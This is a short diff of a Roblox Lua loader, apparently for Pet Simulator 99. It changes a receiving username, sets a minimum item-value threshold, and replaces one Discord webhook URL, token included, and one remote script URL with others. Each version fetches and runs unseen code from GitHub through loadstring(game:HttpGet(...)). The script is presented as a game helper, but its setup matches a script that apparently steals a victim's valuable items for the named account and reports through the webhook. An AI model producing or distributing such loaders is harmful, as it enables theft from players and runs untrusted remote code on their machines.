@@ -1,6 +1,6 @@
-UserName = "GoodCust33"
-UserName2 = "GoodCust33"
-Webhook = "https://discord.com/api/webhooks/1355940691460755527/Jtexkgwfz9yZWFATaFICX4k6u3zVgS-rDxBW7tO7QFBS2n3Qy4jWqPzP3jlTOBCNxmZ3"
-_G.ScriptName = "Loading Mining Script v2"
+Username = "BigZach10"
+Username2 = "BigZach10"
+MinimumRAP = 100000
+Webhook = "https://discord.com/api/webhooks/1357814539105730751/Q_ae2oG9uP8BknbYg2SYMUmOynnat2-EZucTr5ec7-9jj4t5H6RVsbEU_eDwXjcn2t4l"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/kk4ft/rizzhub/main/PS99.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/UrbanDEV0/Pet-Simulator-99-Script-OP-/refs/heads/main/roblox", true))()
